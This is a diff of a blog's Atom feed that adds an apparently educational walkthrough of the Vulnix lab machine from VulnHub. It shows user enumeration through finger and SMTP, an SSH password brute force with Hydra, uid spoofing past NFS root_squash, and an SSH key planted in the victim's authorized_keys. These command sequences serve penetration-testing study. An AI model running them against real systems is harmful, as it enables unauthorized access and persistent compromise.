@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-06-19T12:53:58-04:00</updated>
+  <updated>2017-06-21T11:01:26-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,679 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[HackLAB Vulnix]]></title>
+    <link href="http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix/"/>
+    <updated>2017-06-20T08:04:29-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/06/20/hacklab-vulnix</id>
+    <content type="html"><![CDATA[<p>Vulnix is an older machine from VulnHub that intends to present vulnerabilities from a misconfiguration point of view. The goal is to get the flag inside /root</p>
+
+<!-- more -->
+
+
+<p>Here are the Nmap results:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE    VERSION
+</span><span class='line'>22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>25/tcp    open  smtp       Postfix smtpd
+</span><span class='line'>79/tcp    open  finger     Linux fingerd
+</span><span class='line'>110/tcp   open  pop3?
+</span><span class='line'>111/tcp   open  rpcbind    2-4 (RPC #100000)
+</span><span class='line'>143/tcp   open  imap       Dovecot imapd
+</span><span class='line'>512/tcp   open  exec       netkit-rsh rexecd
+</span><span class='line'>513/tcp   open  login
+</span><span class='line'>514/tcp   open  tcpwrapped
+</span><span class='line'>993/tcp   open  ssl/imap   Dovecot imapd
+</span><span class='line'>995/tcp   open  ssl/pop3s?
+</span><span class='line'>2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+</span><span class='line'>36190/tcp open  status     1 (RPC #100024)
+</span><span class='line'>40731/tcp open  mountd     1-3 (RPC #100005)
+</span><span class='line'>43539/tcp open  nlockmgr   1-4 (RPC #100021)
+</span><span class='line'>46423/tcp open  mountd     1-3 (RPC #100005)
+</span><span class='line'>52024/tcp open  mountd     1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>finger user enumeration</h3>
+
+<p>There are quite a few services listening on the host. One of the first things that grabbed my attention was finger running on port 79. Because of this, we can use finger to perform <a href="https://pentestlab.blog/tag/finger/">user enumeration</a> on the host. We can use Nmap&rsquo;s script scan to see who is logged on the host, or do it manually. Here I will show the manual way:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>finger @192.168.217.142
+</span><span class='line'>No one logged on.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The same thing can be achieved by running Nmap with the <em>-sC</em> flag. Next I tried to get more information about the root user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>finger root@192.168.217.142
+</span><span class='line'>Login: root                       Name: root
+</span><span class='line'>Directory: /root                      Shell: /bin/bash
+</span><span class='line'>Never logged in.
+</span><span class='line'>No mail.
+</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seems the root user never logged in, but we still obtained the directory and shell that root uses. I tried a few more guesses and discovered a couple more users on the host:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>finger user@192.168.217.142
+</span><span class='line'>Login: user                       Name: user
+</span><span class='line'>Directory: /home/user                 Shell: /bin/bash
+</span><span class='line'>Never logged in.
+</span><span class='line'>No mail.
+</span><span class='line'>No Plan.
+</span><span class='line'>
+</span><span class='line'>Login: dovenull                   Name: Dovecot login user
+</span><span class='line'>Directory: /nonexistent               Shell: /bin/false
+</span><span class='line'>Never logged in.
+</span><span class='line'>No mail.
+</span><span class='line'>No Plan.
+</span><span class='line'>
+</span><span class='line'>finger vulnix@192.168.217.142
+</span><span class='line'>Login: vulnix                     Name: 
+</span><span class='line'>Directory: /home/vulnix               Shell: /bin/bash
+</span><span class='line'>Never logged in.
+</span><span class='line'>No mail.
+</span><span class='line'>No Plan.</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>SMTP user enumeration</h3>
+
+<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>
+
+<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>
+
+<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
+Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
+work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>
+
+<p>Let&rsquo;s see its options:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+</span><span class='line'>
+</span><span class='line'>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
+</span><span class='line'>
+</span><span class='line'>options are:
+</span><span class='line'>        -m n     Maximum number of processes (default: 5)
+</span><span class='line'>  -M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
+</span><span class='line'>  -u user  Check if user exists on remote system
+</span><span class='line'>  -f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
+</span><span class='line'>        -D dom   Domain to append to supplied user list to make email addresses (Default: none)
+</span><span class='line'>                 Use this option when you want to guess valid email addresses instead of just usernames
+</span><span class='line'>                 e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
+</span><span class='line'>                      simply the usernames foo and bar.
+</span><span class='line'>  -U file  File of usernames to check via smtp service
+</span><span class='line'>  -t host  Server host running smtp service
+</span><span class='line'>  -T file  File of hostnames running the smtp service
+</span><span class='line'>  -p port  TCP port on which smtp service runs (default: 25)
+</span><span class='line'>  -d       Debugging output
+</span><span class='line'>  -t n     Wait a maximum of n seconds for reply (default: 5)
+</span><span class='line'>  -v       Verbose
+</span><span class='line'>  -h       This help message
+</span><span class='line'>
+</span><span class='line'>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.
+</span><span class='line'>
+</span><span class='line'>Examples:
+</span><span class='line'>
+</span><span class='line'>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
+</span><span class='line'>$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
+</span><span class='line'>$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
+</span><span class='line'>$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
+</span><span class='line'>Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+</span><span class='line'>
+</span><span class='line'> ----------------------------------------------------------
+</span><span class='line'>|                   Scan Information                       |
+</span><span class='line'> ----------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>Mode ..................... VRFY
+</span><span class='line'>Worker Processes ......... 5
+</span><span class='line'>Usernames file ........... users.txt
+</span><span class='line'>Target count ............. 1
+</span><span class='line'>Username count ........... 6
+</span><span class='line'>Target TCP port .......... 25
+</span><span class='line'>Query timeout ............ 5 secs
+</span><span class='line'>Target domain ............ 
+</span><span class='line'>
+</span><span class='line'>######## Scan started at Tue Jun 20 09:29:30 2017 #########
+</span><span class='line'>192.168.217.142: root exists
+</span><span class='line'>192.168.217.142: vulnix exists
+</span><span class='line'>192.168.217.142: user exists
+</span><span class='line'>192.168.217.142: postmaster exists
+</span><span class='line'>192.168.217.142: mail exists
+</span><span class='line'>######## Scan completed at Tue Jun 20 09:29:30 2017 #########
+</span><span class='line'>5 results.
+</span><span class='line'>
+</span><span class='line'>6 queries in 1 seconds (6.0 queries / sec)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>
+
+<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>
+
+<h3>Exploit NFS</h3>
+
+<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p 192.168.217.142
+</span><span class='line'>   program vers proto   port  service
+</span><span class='line'>    100000    4   tcp    111  portmapper
+</span><span class='line'>    100000    3   tcp    111  portmapper
+</span><span class='line'>    100000    2   tcp    111  portmapper
+</span><span class='line'>    100000    4   udp    111  portmapper
+</span><span class='line'>    100000    3   udp    111  portmapper
+</span><span class='line'>    100000    2   udp    111  portmapper
+</span><span class='line'>    100024    1   udp  39427  status
+</span><span class='line'>    100024    1   tcp  42309  status
+</span><span class='line'>    100003    2   tcp   2049  nfs
+</span><span class='line'>    100003    3   tcp   2049  nfs
+</span><span class='line'>    100003    4   tcp   2049  nfs
+</span><span class='line'>    100227    2   tcp   2049
+</span><span class='line'>    100227    3   tcp   2049
+</span><span class='line'>    100003    2   udp   2049  nfs
+</span><span class='line'>    100003    3   udp   2049  nfs
+</span><span class='line'>    100003    4   udp   2049  nfs
+</span><span class='line'>    100227    2   udp   2049
+</span><span class='line'>    100227    3   udp   2049
+</span><span class='line'>    100021    1   udp  39258  nlockmgr
+</span><span class='line'>    100021    3   udp  39258  nlockmgr
+</span><span class='line'>    100021    4   udp  39258  nlockmgr
+</span><span class='line'>    100021    1   tcp  34418  nlockmgr
+</span><span class='line'>    100021    3   tcp  34418  nlockmgr
+</span><span class='line'>    100021    4   tcp  34418  nlockmgr
+</span><span class='line'>    100005    1   udp  34638  mountd
+</span><span class='line'>    100005    1   tcp  52581  mountd
+</span><span class='line'>    100005    2   udp  42603  mountd
+</span><span class='line'>    100005    2   tcp  53226  mountd
+</span><span class='line'>    100005    3   udp  49704  mountd
+</span><span class='line'>    100005    3   tcp  47770  mountd</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# showmount -e 192.168.217.142
+</span><span class='line'>Export list for 192.168.217.142:
+</span><span class='line'>/home/vulnix *</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV -p111 --script=nfs-showmount 192.168.217.142
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-21 06:00 EDT
+</span><span class='line'>Nmap scan report for 192.168.217.142
+</span><span class='line'>Host is up (0.00027s latency).
+</span><span class='line'>PORT    STATE SERVICE VERSION
+</span><span class='line'>111/tcp open  rpcbind 2-4 (RPC #100000)
+</span><span class='line'>| nfs-showmount: 
+</span><span class='line'>|_  /home/vulnix *
+</span><span class='line'>| rpcinfo: 
+</span><span class='line'>|   program version   port/proto  service
+</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
+</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
+</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
+</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
+</span><span class='line'>|   100005  1,2,3      47770/tcp  mountd
+</span><span class='line'>|   100005  1,2,3      49704/udp  mountd
+</span><span class='line'>|   100021  1,3,4      34418/tcp  nlockmgr
+</span><span class='line'>|   100021  1,3,4      39258/udp  nlockmgr
+</span><span class='line'>|   100024  1          39427/udp  status
+</span><span class='line'>|   100024  1          42309/tcp  status
+</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
+</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(nfsmount) &gt; run
+</span><span class='line'>
+</span><span class='line'>[+] 192.168.217.142:111   - 192.168.217.142 NFS Export: /home/vulnix [*]
+</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
+</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir nfs
+</span><span class='line'>root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>
+
+<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; help
+</span><span class='line'>host &lt;host&gt; - set remote host name
+</span><span class='line'>uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
+</span><span class='line'>gid [&lt;gid&gt;] - set remote group id
+</span><span class='line'>cd [&lt;path&gt;] - change remote working directory
+</span><span class='line'>lcd [&lt;path&gt;] - change local working directory
+</span><span class='line'>cat &lt;filespec&gt; - display remote file
+</span><span class='line'>ls [-l] &lt;filespec&gt; - list remote directory
+</span><span class='line'>get &lt;filespec&gt; - get remote files
+</span><span class='line'>df - file system information
+</span><span class='line'>rm &lt;file&gt; - delete remote file
+</span><span class='line'>ln &lt;file1&gt; &lt;file2&gt; - link file
+</span><span class='line'>mv &lt;file1&gt; &lt;file2&gt; - move file
+</span><span class='line'>mkdir &lt;dir&gt; - make remote directory
+</span><span class='line'>rmdir &lt;dir&gt; - remove remote directory
+</span><span class='line'>chmod &lt;mode&gt; &lt;file&gt; - change mode
+</span><span class='line'>chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
+</span><span class='line'>put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
+</span><span class='line'>mount [-upTU] [-P port] &lt;path&gt; - mount file system
+</span><span class='line'>umount - umount remote file system
+</span><span class='line'>umountall - umount all remote file systems
+</span><span class='line'>export - show all exported file systems
+</span><span class='line'>dump - show all remote mounted file systems
+</span><span class='line'>status - general status report
+</span><span class='line'>help - this help message
+</span><span class='line'>quit - its all in the name
+</span><span class='line'>bye - good bye
+</span><span class='line'>handle [&lt;handle&gt;] - get/set directory file handle
+</span><span class='line'>mknod &lt;name&gt; [b/c major minor] [p] - make device</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/vulnix-hydra.png" title="hydra" alt="letmein"></p>
+
+<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@vulnix:~$ id vulnix
+</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went back to nfsshell and made the changes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; host 192.168.217.142
+</span><span class='line'>Using a privileged port (1023)
+</span><span class='line'>Open 192.168.217.142 (192.168.217.142) TCP
+</span><span class='line'>nfs&gt; uid 2008
+</span><span class='line'>nfs&gt; gid 2008
+</span><span class='line'>nfs&gt; status
+</span><span class='line'>User id      : 2008
+</span><span class='line'>Group id     : 2008
+</span><span class='line'>Remote host  : `192.168.217.142'
+</span><span class='line'>Transfer size: 0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I was able to access the share:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nfs&gt; ls -l
+</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
+</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
+</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
+</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
+</span><span class='line'>drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# su vulnix
+</span><span class='line'>$ id
+</span><span class='line'>uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+</span><span class='line'>$ cd /tmp
+</span><span class='line'>$ ssh-keygen
+</span><span class='line'>Generating public/private rsa key pair.
+</span><span class='line'>Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
+</span><span class='line'>Enter passphrase (empty for no passphrase): 
+</span><span class='line'>Enter same passphrase again: 
+</span><span class='line'>Your identification has been saved in vulnix.
+</span><span class='line'>Your public key has been saved in vulnix.pub.
+</span><span class='line'>The key fingerprint is:
+</span><span class='line'>SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
+</span><span class='line'>The key's randomart image is:
+</span><span class='line'>+---[RSA 2048]----+
+</span><span class='line'>|  .o.oo.++o+o .oo|
+</span><span class='line'>|   +o. o .o. ..+ |
+</span><span class='line'>|  = + o .   o...o|
+</span><span class='line'>| o = o     . oo.+|
+</span><span class='line'>|    = + S o  ..+o|
+</span><span class='line'>|   o . + + o  .oo|
+</span><span class='line'>|  .     o +    o.|
+</span><span class='line'>|  ..       .    .|
+</span><span class='line'>|.E.              |
+</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
+</span><span class='line'>$ cat .ssh/authorized_keys
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali</span></code></pre></td></tr></table></div></figure>
+
+
